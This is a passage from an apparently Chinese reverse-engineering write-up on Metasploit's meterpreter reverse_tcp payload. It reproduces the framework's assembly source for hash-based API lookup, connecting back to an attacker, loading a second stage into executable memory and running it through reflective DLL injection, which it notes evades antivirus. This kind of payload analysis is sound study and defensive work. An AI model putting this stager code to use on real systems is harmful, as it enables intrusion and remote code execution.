<p>如果当前模块存在导出表则遍历导出函数名称进行Hash，如果当前导出函数Hash加上当前模块的Hash等于预定的Hash值判断此函数就是要找的，之后就通过遍历导出表计算出此导出函数的地址</p>
<img src="/Internals_meterpreter_payload/5.jpg" title="图5">
<p>之后通过<code>jmp eax</code>来调用获取到的对应函数</p>
<img src="/Internals_meterpreter_payload/6.jpg" title="图6">
<p>接下来我们分析一下<code>asm_block_api</code>函数的实现源码，但是在当前<code>asm_reverse_tcp.rb</code>中并没有这个函数，判断应该是调用了其他源文件中的函数，我们查看头部包含的文件发现包含了<code>msf/core/payload/windows/block_api</code>这个源文件，我们在当前目录下查找发现了<code>block_api.rb</code>应该就是我们要找的了</p>
<figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line"><span class="comment"># filepath /usr/share/metasploit-framework/lib/msf/core/payload/windows/reverse_tcp.rb</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">'msf/core'</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">'msf/core/payload/transport_config'</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">'msf/core/payload/windows/send_uuid'</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">'msf/core/payload/windows/block_api'</span>	<span class="comment"># 调用了block_api这个源文件</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">'msf/core/payload/windows/exitfunk'</span></span><br></pre></td></tr></table></figure>
<p>我们将<code>asm_block_api</code>函数的源码都扒下来分析（源码注释为机翻），可以看到<code>asm_block_api</code>函数的实现源码和我们刚才逆向分析的基本相同，不同的地方就是源码中的偏移使用的是十进制，而我们使用的x64dbg中是十六进制显示的</p>
<figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line"><span class="comment"># filepath /usr/share/metasploit-framework/lib/msf/core/payload/windows/block_api.rb</span></span><br><span class="line"><span class="class"><span class="keyword">module</span> <span class="title">payload::Windows::BlockApi</span></span></span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">asm_block_api</span><span class="params">(opts=&#123;&#125;)</span></span></span><br><span class="line"></span><br><span class="line">    raw = %q^</span><br><span class="line"></span><br><span class="line">    <span class="symbol">api_call:</span></span><br><span class="line">      pushad                    ; 我们保留调用者的所有寄存器，除了EAX和ECX.</span><br><span class="line">      mov ebp, esp              ; 开辟栈帧</span><br><span class="line">      xor eax, eax              ; 清空 EAX (在找到函数之前，上面的<span class="number">3</span>个字节将保持为零)</span><br><span class="line">      mov edx, [<span class="symbol">fs:</span>eax+<span class="number">48</span>]      ; 获得指向PEB的指针</span><br><span class="line">      mov edx, [edx+<span class="number">12</span>]         ; Get PEB-&gt;Ldr</span><br><span class="line">      mov edx, [edx+<span class="number">20</span>]         ; 从InMemoryOrder模块列表中获取第一个模块</span><br><span class="line">    <span class="symbol">next_mod:</span>                   ;</span><br><span class="line">      mov esi, [edx+<span class="number">40</span>]         ; 获取指向模块名称的指针(unicode字符串)</span><br><span class="line">      movzx ecx, word [edx+<span class="number">38</span>]  ; 将ECX设置为我们要检查的长度</span><br><span class="line">      xor edi, edi              ; 清除EDI，它将存储模块名称的散列</span><br><span class="line">    <span class="symbol">loop_modname:</span>               ;</span><br><span class="line">      lodsb                     ; 读取名称的下一个字节</span><br><span class="line">      cmp al, <span class="string">'a'</span>               ; 一些版本的Windows使用小写模块名</span><br><span class="line">      jl not_lowercase          ;</span><br><span class="line">      sub al, <span class="number">0x20</span>              ; 如果是这样，就用大写字母表示</span><br><span class="line">    <span class="symbol">not_lowercase:</span>              ;</span><br><span class="line">      ror edi, <span class="number">13</span>               ; 向右旋转哈希值</span><br><span class="line">      add edi, eax              ; 添加名称的下一个字节</span><br><span class="line">      loop loop_modname         ; 循环直到我们读够为止</span><br><span class="line"></span><br><span class="line">      ; 现在我们已经计算了模块哈希</span><br><span class="line">      push edx                  ; 在模块列表中保存当前位置，以备以后使用</span><br><span class="line">      push edi                  ; 保存当前模块Hash</span><br><span class="line">      ; 继续迭代导出地址表</span><br><span class="line">      mov edx, [edx+<span class="number">16</span>]         ; 获取此模块的基址</span><br><span class="line">      mov ecx, [edx+<span class="number">60</span>]         ; 获取 PE header</span><br><span class="line"></span><br><span class="line">      ; 这里使用ecx作为我们的EAT指针，这样我们就可以利用jecxz了</span><br><span class="line">      mov ecx, [ecx+edx+<span class="number">120</span>]    ; 从PE头部获取EAT</span><br><span class="line">      jecxz get_next_mod1       ; 如果不存在EAT,继续下一个模块</span><br><span class="line">      add ecx, edx              ; 相加模块基址</span><br><span class="line">      push ecx                  ; 保存当前模块EAT</span><br><span class="line">      mov ebx, [ecx+<span class="number">32</span>]         ; 获取函数名的rva</span><br><span class="line">      add ebx, edx              ; 相加模块基址</span><br><span class="line">      mov ecx, [ecx+<span class="number">24</span>]         ; 获取函数名的数目</span><br><span class="line">      ; now ecx returns to its regularly scheduled counter duties</span><br><span class="line"></span><br><span class="line">      ; 计算模块哈希+函数哈希</span><br><span class="line">    <span class="symbol">get_next_func:</span>              ;</span><br><span class="line">      jecxz get_next_mod        ; 当我们到达EAT的开始(向后搜索)时，处理下一个模块</span><br><span class="line">      dec ecx                   ; 递减函数名称计数器</span><br><span class="line">      mov esi, [ebx+ecx*<span class="number">4</span>]      ; 获取下一个模块名称的rva</span><br><span class="line">      add esi, edx              ; 相加模块基址</span><br><span class="line">      xor edi, edi              ; 清除EDI，它将存储函数名的散列</span><br><span class="line">      ; 把它和我们想要的相比较</span><br><span class="line">    <span class="symbol">loop_funcname:</span>              ;</span><br><span class="line">      lodsb                     ; 读取ASCII函数名的下一个字节</span><br><span class="line">      ror edi, <span class="number">13</span>               ; 向右旋转哈希值</span><br><span class="line">      add edi, eax              ; 添加名称的下一个字节</span><br><span class="line">      cmp al, ah                ; 比较AL(名称中的下一个字节)和AH (null)</span><br><span class="line">      jne loop_funcname         ; 如果还没有到达空终止符，请继续</span><br><span class="line">      add edi, [ebp-<span class="number">8</span>]          ; 将当前模块哈希添加到函数哈希中</span><br><span class="line">      cmp edi, [ebp+<span class="number">36</span>]         ; 将散列与searchnig查找的散列进行比较</span><br><span class="line">      jnz get_next_func         ; 去计算下一个函数哈希如果我们还没有找到它</span><br><span class="line"></span><br><span class="line">      ; 如果找到，修复堆栈，调用函数，然后计算下一个函数的值...</span><br><span class="line">      pop eax                   ; 恢复当前模块EAT</span><br><span class="line">      mov ebx, [eax+<span class="number">36</span>]         ; 获取序数表rva</span><br><span class="line">      add ebx, edx              ; 相加模块基址</span><br><span class="line">      mov cx, [ebx+<span class="number">2</span>*ecx]       ; 按顺序得到所需的函数</span><br><span class="line">      mov ebx, [eax+<span class="number">28</span>]         ; 获取函数地址表rva</span><br><span class="line">      add ebx, edx              ; 相加模块基址</span><br><span class="line">      mov eax, [ebx+<span class="number">4</span>*ecx]      ; 得到所需的函数RVA</span><br><span class="line">      add eax, edx              ; 相加模块基址以获得实际的函数VA</span><br><span class="line">      ; 现在，我们修复堆栈并执行对所需函数的调用...</span><br><span class="line">    <span class="symbol">finish:</span></span><br><span class="line">      mov [esp+<span class="number">36</span>], eax         ; 用即将到来的popad所需的api地址覆盖旧的EAX值</span><br><span class="line">      pop ebx                   ; 清除当前模块散列</span><br><span class="line">      pop ebx                   ; 清除模块列表中的当前位置</span><br><span class="line">      popad                     ; 恢复所有的调用者寄存器</span><br><span class="line">      pop ecx                   ; 弹出调用者将推送的原始返回地址</span><br><span class="line">      pop edx                   ; 弹出调用者将推送的散列值</span><br><span class="line">      push ecx                  ; 返回正确的返回值</span><br><span class="line">      jmp eax                   ; 跳转到所需的函数</span><br><span class="line">      ; 现在我们自动返回到正确的调用者...</span><br><span class="line"></span><br><span class="line">    <span class="symbol">get_next_mod:</span>               ;</span><br><span class="line">      pop edi                   ; 关闭当前(现在前面的)模块EAT</span><br><span class="line">    <span class="symbol">get_next_mod1:</span>              ;</span><br><span class="line">      pop edi                   ; 弹出当前(现在是以前的)模块散列</span><br><span class="line">      pop edx                   ; 恢复我们在模块列表中的位置</span><br><span class="line">      mov edx, [edx]            ; 获取下一个模块</span><br><span class="line">      jmp.i8 next_mod           ; 下一个模块</span><br><span class="line">    ^</span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure>
<p>接下来我们对<code>asm_reverse_tcp</code>函数的全部源码进行分析，首先该函数获取了LoadLibrary函数地址并加载ws2_32模块，此模块中实现了很多网络相关的API，由于我们使用的<code>payload</code>为<code>reverse_tcp</code>所以可以推断接下来应该会创建tcp连接并且主动连接攻击机，可以推断创建反向tcp连接的步骤大致为如下<code>WSAStartup-&gt;socket-&gt;bind-&gt;connect-&gt;send-&gt;recv</code>，接下来我们来阅读<code>asm_reverse_tcp</code>函数源码主要逻辑就是创建反向tcp连接的过程，注意有个重试计数<code>0xA</code>，如果重试连接<code>0xA</code>次还是连接失败将会调用ExitProcess函数退出进程</p>
<figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line"><span class="comment"># filepath /usr/share/metasploit-framework/lib/msf/core/payload/windows/reverse_tcp.rb</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">asm_reverse_tcp</span><span class="params">(opts=&#123;&#125;)</span></span></span><br><span class="line"></span><br><span class="line">    retry_count  = [opts[<span class="symbol">:retry_count</span>].to_i, <span class="number">1</span>].max</span><br><span class="line">    encoded_port = <span class="string">"0x%.8x"</span> % [opts[<span class="symbol">:port</span>].to_i,<span class="number">2</span>].pack(<span class="string">"vn"</span>).unpack(<span class="string">"N"</span>).first</span><br><span class="line">    encoded_host = <span class="string">"0x%.8x"</span> % Rex::Socket.addr_aton(opts[<span class="symbol">:host</span>]<span class="params">||</span><span class="string">"127.127.127.127"</span>).unpack(<span class="string">"V"</span>).first</span><br><span class="line"></span><br><span class="line">    addr_fam      = <span class="number">2</span></span><br><span class="line">    sockaddr_size = <span class="number">16</span></span><br><span class="line"></span><br><span class="line">    asm = %Q^</span><br><span class="line">      ; 输入<span class="symbol">:EBP</span>必须是<span class="string">'api_call'</span>的地址.</span><br><span class="line">      ; 输出<span class="symbol">:EDI</span>将是连接到服务器的套接字</span><br><span class="line">      ; <span class="symbol">Clobbers:</span> EAX、ESI、EDI、ESP也将被修改(-<span class="number">0x1A0</span>)</span><br><span class="line"></span><br><span class="line">      <span class="symbol">reverse_tcp:</span></span><br><span class="line">        push <span class="string">'32'</span>               ; 将字节<span class="string">'ws2_32'</span>(<span class="number">0</span>,<span class="number">0</span>)压入堆栈。</span><br><span class="line">        push <span class="string">'ws2_'</span>             ; ...</span><br><span class="line">        push esp                ; 将指针推到堆栈上的“ws2_32”字符串.</span><br><span class="line">        push <span class="comment">#&#123;Rex::Text.block_api_hash('kernel32.dll', 'LoadLibraryA')&#125;</span></span><br><span class="line">        mov eax, ebp</span><br><span class="line">        call eax                ; LoadLibraryA( <span class="string">"ws2_32"</span> )</span><br><span class="line"></span><br><span class="line">        mov eax, <span class="number">0x0190</span>         ; EAX = sizeof( struct WSAData )</span><br><span class="line">        sub esp, eax            ; 为WSAData结构分配一些空间</span><br><span class="line">        push esp                ; 将指针指向这个结构体</span><br><span class="line">        push eax                ; 压栈wVersionRequested参数</span><br><span class="line">        push <span class="comment">#&#123;Rex::Text.block_api_hash('ws2_32.dll', 'WSAStartup')&#125;</span></span><br><span class="line">        call ebp                ; WSAStartup( <span class="number">0x0190</span>, &amp;WSAData );</span><br><span class="line"></span><br><span class="line">      <span class="symbol">set_address:</span></span><br><span class="line">        push <span class="comment">#&#123;retry_count&#125;     ; 重试计数</span></span><br><span class="line"></span><br><span class="line">      <span class="symbol">create_socket:</span></span><br><span class="line">        push <span class="comment">#&#123;encoded_host&#125;    ; 主机采用little-endian格式</span></span><br><span class="line">        push <span class="comment">#&#123;encoded_port&#125;    ; family AF_INET and port number</span></span><br><span class="line">        mov esi, esp            ; 保存指向sockaddr结构体的指针</span><br><span class="line"></span><br><span class="line">        push eax                ; 如果我们成功了，eax将为零, push zero <span class="keyword">for</span> the flags param.</span><br><span class="line">        push eax                ; 保留参数push null</span><br><span class="line">        push eax                ; 我们不指定WSAPROTOCOL_INFO结构</span><br><span class="line">        push eax                ; 我们不指定协议</span><br><span class="line">        inc eax                 ;</span><br><span class="line">        push eax                ; push SOCK_STREAM</span><br><span class="line">        inc eax                 ;</span><br><span class="line">        push eax                ; push AF_INET</span><br><span class="line">        push <span class="comment">#&#123;Rex::Text.block_api_hash('ws2_32.dll', 'WSASocketA')&#125;</span></span><br><span class="line">        call ebp                ; WSASocketA( AF_INET, SOCK_STREAM, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span> );</span><br><span class="line">        xchg edi, eax           ; 将套接字保存以后，不要关心eax的值</span><br><span class="line">    ^</span><br><span class="line">    <span class="comment"># 检查是否指定了绑定端口</span></span><br><span class="line">    <span class="keyword">if</span> opts[<span class="symbol">:bind_port</span>]</span><br><span class="line">      bind_port    = opts[<span class="symbol">:bind_port</span>]</span><br><span class="line">      encoded_bind_port = <span class="string">"0x%.8x"</span> % [bind_port.to_i,<span class="number">2</span>].pack(<span class="string">"vn"</span>).unpack(<span class="string">"N"</span>).first</span><br><span class="line">      asm &lt;&lt; %Q^</span><br><span class="line">        xor eax, eax</span><br><span class="line">        push <span class="number">11</span></span><br><span class="line">        pop ecx</span><br><span class="line">        <span class="symbol">push_0_loop:</span></span><br><span class="line">        push eax               ; 如果我们成功了，eax将为零, push it enough times</span><br><span class="line">                               ; 以同时满足IPv4和IPv6</span><br><span class="line">        loop push_0_loop</span><br><span class="line"></span><br><span class="line">                         ; bind to <span class="number">0</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">0</span>/[<span class="symbol">:</span><span class="symbol">:</span>], pushed above </span><br><span class="line">        push <span class="comment">#&#123;encoded_bind_port&#125;   ; family AF_INET and port number</span></span><br><span class="line">        mov esi, esp           ; 保存指向sockaddr_in结构体的指针</span><br><span class="line">        push <span class="comment">#&#123;sockaddr_size&#125;  ; sockaddr_in结构体的长度(我们只设置了前8个字节，其余的不使用)</span></span><br><span class="line">        push esi               ; 指向sockaddr_in结构体的指针</span><br><span class="line">        push edi               ; socket</span><br><span class="line">        push <span class="comment">#&#123;Rex::Text.block_api_hash('ws2_32.dll', 'bind')&#125;</span></span><br><span class="line">        call ebp               ; bind( s, &amp;sockaddr_in, <span class="number">16</span> );</span><br><span class="line">        push <span class="comment">#&#123;encoded_host&#125;    ; 主机采用little-endian格式</span></span><br><span class="line">        push <span class="comment">#&#123;encoded_port&#125;    ; family AF_INET and port number</span></span><br><span class="line">        mov esi, esp</span><br><span class="line">      ^</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">    </span><br><span class="line">    asm &lt;&lt; %Q^</span><br><span class="line">      <span class="symbol">try_connect:</span></span><br><span class="line">        push <span class="number">16</span>                 ; sockaddr结构的长度</span><br><span class="line">        push esi                ; 指向sockaddr结构体的指针</span><br><span class="line">        push edi                ; the socket</span><br><span class="line">        push <span class="comment">#&#123;Rex::Text.block_api_hash('ws2_32.dll', 'connect')&#125;</span></span><br><span class="line">        call ebp                ; connect( s, &amp;sockaddr, <span class="number">16</span> );</span><br><span class="line"></span><br><span class="line">        test eax,eax            ; 非零意味着失败</span><br><span class="line">        jz connected</span><br><span class="line"></span><br><span class="line">      <span class="symbol">handle_connect_failure:</span></span><br><span class="line">        ; 减少我们的尝试计数，然后再试一次</span><br><span class="line">        dec dword [esi+<span class="number">8</span>]</span><br><span class="line">        jnz try_connect</span><br><span class="line">    ^</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> opts[<span class="symbol">:exitfunk</span>]</span><br><span class="line">      asm &lt;&lt; %Q^</span><br><span class="line">      <span class="symbol">failure:</span></span><br><span class="line">        call exitfunk</span><br><span class="line">      ^</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      asm &lt;&lt; %Q^</span><br><span class="line">      <span class="symbol">failure:</span></span><br><span class="line">        push <span class="number">0x56A2B5F0</span>         ; 硬编码为exitprocess的大小</span><br><span class="line">        call ebp</span><br><span class="line">      ^</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">    asm &lt;&lt; %Q^</span><br><span class="line">      ; 此标签是必需的，以便重新连接的尝试包括</span><br><span class="line">      ; the UUID stuff <span class="keyword">if</span> required.</span><br><span class="line">      <span class="symbol">connected:</span></span><br><span class="line">    ^</span><br><span class="line"></span><br><span class="line">    asm &lt;&lt; asm_send_uuid <span class="keyword">if</span> include_send_uuid</span><br><span class="line"></span><br><span class="line">    asm</span><br><span class="line">  <span class="keyword">end</span></span><br></pre></td></tr></table></figure>
<p>我们走到第一次<code>recv</code>函数后的<code>VirtualAlloc</code>函数处，函数的dwsize参数为<code>recv</code>函数第一次接收到的</p>
<img src="/Internals_meterpreter_payload/7.jpg" title="图7">
<p>我们使用<code>WireShark</code>分析数据包，由于抓到的数据太多了根据我们配置的<code>payload</code>使用<code>tcp.port == 6666</code>进行过滤</p>
<img src="/Internals_meterpreter_payload/8.jpg" title="图8">
<p>我们分析过滤后的数据包找到攻击机首次发送的数据包，可以发现大小为4字节，和<code>recv</code>接收到的大小相同，我们看看接收到的内容<code>0x2be43</code>，对比下<code>VirtualAlloc</code>函数的<code>dwSize</code>参数发现完全相同</p>
<img src="/Internals_meterpreter_payload/9.jpg" title="图9">
<p>我们分析第二次接收的数据stage，熟悉PE结构的人看到<code>4D5A</code>标志应该都应该会推断这是一个PE文件，但是dos头除了MZ标志之外dos头其他的字段被修改成了一段硬编码，可以看到<code>E8 00000000</code>GetPC操作，可见stage头部被修改成为了一段<code>bootstrapper</code></p>
<img src="/Internals_meterpreter_payload/10.jpg" title="图10">
<p>接下来我们分析对应的源码<code>asm_block_recv</code>函数，根据函数名可知此函数主要就是负责接收来自攻击机发送的各种payload，主要流程首先<code>recv</code>接受4字节的<code>stage</code>大小，然后<code>VirtualAlloc</code>一块<code>RWX</code>属性的缓冲区大小为第一次recv接收的4字节<code>stage size</code>，然后再循环接收全部<code>stage</code>，如果<code>stage</code>全部接收成功则<code>ret</code>到<code>stage</code>执行，如果失败就使用<code>VirtualFree</code>释放内存并关闭<code>socket</code>，然后进行重试计数</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># filepath /usr/share/metasploit-framework/lib/msf/core/payload/windows/reverse_tcp.rb</span><br><span class="line">def asm_block_recv(opts=&#123;&#125;)</span><br><span class="line">    reliable     = opts[:reliable]</span><br><span class="line">    asm = %Q^</span><br><span class="line">      recv:</span><br><span class="line">        ; 接收传入第二阶段的大小...</span><br><span class="line">        push 0                  ; flags</span><br><span class="line">        push 4                  ; length = sizeof( DWORD );</span><br><span class="line">        push esi                ; 堆栈上的4字节缓冲区，用于保存第二阶段长度</span><br><span class="line">        push edi                ; the saved socket</span><br><span class="line">        push #&#123;Rex::Text.block_api_hash(&apos;ws2_32.dll&apos;, &apos;recv&apos;)&#125;</span><br><span class="line">        call ebp                ; recv( s, &amp;dwLength, 4, 0 );</span><br><span class="line">    ^</span><br><span class="line"></span><br><span class="line">    if reliable</span><br><span class="line">      asm &lt;&lt; %Q^</span><br><span class="line">        ; reliability: 检查recv是否工作，并重新连接</span><br><span class="line">        ; if it fails</span><br><span class="line">        cmp eax, 0</span><br><span class="line">        jle cleanup_socket</span><br><span class="line">      ^</span><br><span class="line">    end</span><br><span class="line"></span><br><span class="line">    asm &lt;&lt; %Q^</span><br><span class="line">        ; 为第二阶段分配一个RWX缓冲区</span><br><span class="line">        mov esi, [esi]          ; dereference the pointer to the second stage length</span><br><span class="line">        push 0x40               ; PAGE_EXECUTE_READWRITE</span><br><span class="line">        push 0x1000             ; MEM_COMMIT</span><br><span class="line">        push esi                ; 压栈新接收的第二阶段长度.</span><br><span class="line">        push 0                  ; NULL as we dont care where the allocation is.</span><br><span class="line">        push #&#123;Rex::Text.block_api_hash(&apos;kernel32.dll&apos;, &apos;VirtualAlloc&apos;)&#125;</span><br><span class="line">        call ebp                ; VirtualAlloc( NULL, dwLength, MEM_COMMIT, PAGE_EXECUTE_READWRITE );</span><br><span class="line">        ; 接收第二个阶段并执行它...</span><br><span class="line">        xchg ebx, eax           ; ebx = 新内存地址为新stage</span><br><span class="line">        push ebx                ; 压栈新stage地址，这样我们就可以return到新stage了</span><br><span class="line"></span><br><span class="line">      read_more:</span><br><span class="line">        push 0                  ; flags</span><br><span class="line">        push esi                ; length</span><br><span class="line">        push ebx                ; the current address into our second stage&apos;s RWX buffer.</span><br><span class="line">        push edi                ; the saved socket</span><br><span class="line">        push #&#123;Rex::Text.block_api_hash(&apos;ws2_32.dll&apos;, &apos;recv&apos;)&#125;</span><br><span class="line">        call ebp                ; recv( s, buffer, length, 0 );</span><br><span class="line">    ^</span><br><span class="line"></span><br><span class="line">    if reliable</span><br><span class="line">      asm &lt;&lt; %Q^</span><br><span class="line">        ; reliability: 检查recv是否工作，然后重新连接</span><br><span class="line">        ; if it fails</span><br><span class="line">        cmp eax, 0</span><br><span class="line">        jge read_successful</span><br><span class="line"></span><br><span class="line">        ; 执行失败，释放内存</span><br><span class="line">        pop eax                 ; 获取payload的地址</span><br><span class="line">        push 0x4000             ; dwFreeType (MEM_DECOMMIT)</span><br><span class="line">        push 0                  ; dwSize</span><br><span class="line">        push eax                ; lpAddress</span><br><span class="line">        push #&#123;Rex::Text.block_api_hash(&apos;kernel32.dll&apos;, &apos;VirtualFree&apos;)&#125;</span><br><span class="line">        call ebp                ; VirtualFree(payload, 0, MEM_DECOMMIT)</span><br><span class="line"></span><br><span class="line">      cleanup_socket:</span><br><span class="line">        ; 清理 socket</span><br><span class="line">        push edi                ; socket handle</span><br><span class="line">        push #&#123;Rex::Text.block_api_hash(&apos;ws2_32.dll&apos;, &apos;closesocket&apos;)&#125;</span><br><span class="line">        call ebp                ; closesocket(socket)</span><br><span class="line"></span><br><span class="line">        ; 将堆栈还原回连接重试计数</span><br><span class="line">        pop esi</span><br><span class="line">        pop esi</span><br><span class="line">        dec [esp]               ; 减量计数器</span><br><span class="line"></span><br><span class="line">        ; try again</span><br><span class="line">        jnz create_socket</span><br><span class="line">        jmp failure</span><br><span class="line">      ^</span><br><span class="line">    end</span><br><span class="line"></span><br><span class="line">    asm &lt;&lt; %Q^</span><br><span class="line">      read_successful:</span><br><span class="line">        add ebx, eax            ; buffer += bytes_received</span><br><span class="line">        sub esi, eax            ; length -= bytes_received, will set flags</span><br><span class="line">        jnz read_more           ; continue if we have more to read</span><br><span class="line">        ret                     ; 回到第二阶段</span><br><span class="line">    ^</span><br><span class="line"></span><br><span class="line">    if opts[:exitfunk]</span><br><span class="line">      asm &lt;&lt; asm_exitfunk(opts)</span><br><span class="line">    end</span><br><span class="line"></span><br><span class="line">    asm</span><br><span class="line">  end</span><br><span class="line"></span><br><span class="line">end</span><br><span class="line"></span><br><span class="line">end</span><br></pre></td></tr></table></figure>
<p>此时<code>eax</code>为最后一次recv接收的<code>stage</code>大小，<code>sub eax,esi</code>用来判断是否接收完全部<code>stage</code>，<code>esi</code>如果为0说明已经接收完全部<code>stage</code>，接下来的<code>ret</code>指令将转到此时栈顶的<code>stage</code>头部<code>bootstrapper</code>执行</p>
<img src="/Internals_meterpreter_payload/11.jpg" title="图11">
<p>我们使用<code>LordPE</code>的转存区域功能将整个<code>stage</code>dump下来</p>
<img src="/Internals_meterpreter_payload/12.jpg" title="图12">
<p>接着使用pe解析工具查看dump下来的pe文件发现了众多导出函数，我们看到了<code>ReflectiveLoader</code>这个导出函数，中文译为反射式注入，<a href="https://github.com/stephenfewer/ReflectiveDLLInjection" target="_blank" rel="noopener">ReflectiveLoader</a>是由HarmanySecurity的<a href="https://github.com/stephenfewer" target="_blank" rel="noopener">Stephen Fewer</a>提出的，可以判断stage头部<code>bootstrapper</code>的操作肯定会调用此导出函数实现反射式注入从内存直接加载stage，这种注入方式的优点是不会有文件落地，减少了杀毒软件查杀的几率，由于不使用<code>LoadLibrary</code>函数加载当我们使用<code>procexp</code>等工具在目标进程中查找不到此模块加载的痕迹，但是此注入方式需要申请大量的RWX内存，而且这些内存开头一般为PE文件的MZ标志</p>
<img src="/Internals_meterpreter_payload/13.jpg" title="图13">
<p>metasploit中存放此stage的位置在如下位置，可以看到此stage有x86版和x64版本的，除了此stage之后还有众多使用dll实现的payload</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">/usr/share/metasploit-framework/vendor/bundle/ruby/2.5.0/gems/metasploit-payloads-1.3.65/data/meterpreter</span><br></pre></td></tr></table></figure>
<img src="/Internals_meterpreter_payload/stagepath.jpg" title="stagepath">
<p>图14为stage头部<code>bootstrapper</code>处逻辑，至此payload已经完全转移到了stage上执行，<code>4D</code>和<code>5A</code>分别对应<code>dec ebp</code>和<code>pop dex</code>这两条硬编码这两条汇编指令并没有实际用处只是为了保留dos头MZ标志，之后的<code>call next</code>和<code>pop ebx</code>为GetPC操作，接着平衡<code>dec ebp</code>和<code>pop dex</code>这两条汇编指令的操作，然后调用了GetPC操作获取的地址+偏移<code>0x1364</code>处的函数</p>
<img src="/Internals_meterpreter_payload/14.jpg" title="图14">
<p>接下来分析此<code>bootstrapper</code>对应的源码，我们可以看到和我们分析的大致相同，可以看到源码中说了GetPC操作+偏移处的函数就是<code>stage dll</code>中导出的<code>ReflectiveLoader</code>函数，可以看到了源码中还附有<code>ReflectiveLoader</code>函数的实现源码，待反射式注入函数执行完毕就以<code>DLL_METASPLOIT_ATTACH</code>为参数调用DllMain</p>
<figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line"><span class="comment"># filepath /usr/share/metasploit-framework/lib/msf/core/payload/windows/meterpreter_loader.rb</span></span><br><span class="line"><span class="class"><span class="keyword">module</span> <span class="title">payload::Windows::MeterpreterLoader</span></span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">include</span> Msf::ReflectiveDLLLoader</span><br><span class="line">  <span class="keyword">include</span> Msf::payload::Windows</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">initialize</span><span class="params">(info = &#123;&#125;)</span></span></span><br><span class="line">    <span class="keyword">super</span>(update_info(info,</span><br><span class="line">      <span class="string">'Name'</span>          =&gt; <span class="string">'Meterpreter &amp; Configuration RDI'</span>,</span><br><span class="line">      <span class="string">'Description'</span>   =&gt; <span class="string">'Inject Meterpreter &amp; the configuration stub via RDI'</span>,</span><br><span class="line">      <span class="string">'Author'</span>        =&gt; [ <span class="string">'sf'</span>, <span class="string">'OJ Reeves'</span> ],</span><br><span class="line">      <span class="string">'References'</span>    =&gt; [</span><br><span class="line">        [ <span class="string">'URL'</span>, <span class="string">'https://github.com/stephenfewer/ReflectiveDLLInjection'</span> ], <span class="comment"># original</span></span><br><span class="line">        [ <span class="string">'URL'</span>, <span class="string">'https://github.com/rapid7/ReflectiveDLLInjection'</span> ] <span class="comment"># customisations</span></span><br><span class="line">      ],</span><br><span class="line">      <span class="string">'Platform'</span>      =&gt; <span class="string">'win'</span>,</span><br><span class="line">      <span class="string">'Arch'</span>          =&gt; ARCH_X86,</span><br><span class="line">      <span class="string">'payloadCompat'</span> =&gt; &#123; <span class="string">'Convention'</span> =&gt; <span class="string">'sockedi handleedi -https'</span>, &#125;,</span><br><span class="line">      <span class="string">'Stage'</span>         =&gt; &#123; <span class="string">'payload'</span>   =&gt; <span class="string">""</span> &#125;</span><br><span class="line">      ))</span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">asm_invoke_metsrv</span><span class="params">(opts=&#123;&#125;)</span></span></span><br><span class="line">    asm = %Q^</span><br><span class="line">        ; prologue</span><br><span class="line">          dec ebp               ; <span class="string">'M'</span></span><br><span class="line">          pop edx               ; <span class="string">'Z'</span></span><br><span class="line">          call $+<span class="number">5</span>              ; call <span class="keyword">next</span> instruction</span><br><span class="line">          pop ebx               ; 获取当前位置 (+<span class="number">7</span> bytes)</span><br><span class="line">          push edx              ; 恢复edx</span><br><span class="line">          inc ebp               ; 恢复ebp</span><br><span class="line">          push ebp              ; 保存ebp</span><br><span class="line">          mov ebp, esp          ; 开辟栈帧</span><br><span class="line">        ; 调用 ReflectiveLoader()</span><br><span class="line">          ; 将偏移量添加到 ReflectiveLoader() (0x????????)</span><br><span class="line">          add ebx, <span class="comment">#&#123;"0x%.8x" % (opts[:rdi_offset] - 7)&#125;</span></span><br><span class="line">          call ebx              ; 调用 ReflectiveLoader()</span><br><span class="line">        ; 调用 DllMain(hInstance, DLL_METASPLOIT_ATTACH, config_ptr)</span><br><span class="line">          ; offset from ReflectiveLoader() to the <span class="keyword">end</span> of the DLL</span><br><span class="line">          add ebx, <span class="comment">#&#123;"0x%.8x" % (opts[:length] - opts[:rdi_offset])&#125;</span></span><br><span class="line">    ^</span><br><span class="line"></span><br><span class="line">    <span class="keyword">unless</span> opts[<span class="symbol">:stageless</span>] <span class="params">||</span> opts[<span class="symbol">:force_write_handle</span>] == <span class="literal">true</span></span><br><span class="line">      asm &lt;&lt; %Q^</span><br><span class="line">          mov [ebx], edi        ; config_ptr</span><br><span class="line">      ^</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">    asm &lt;&lt; %Q^</span><br><span class="line">          push ebx              ; 将指针指向config_ptr</span><br><span class="line">          push <span class="number">4</span>                ; DLL_METASPLOIT_ATTACH参数</span><br><span class="line">          push eax              ; hInstance</span><br><span class="line">          call eax              ; call DllMain(hInstance, DLL_METASPLOIT_ATTACH, config_ptr)</span><br><span class="line">    ^</span><br><span class="line">  <span class="keyword">end</span></span><br></pre></td></tr></table></figure>
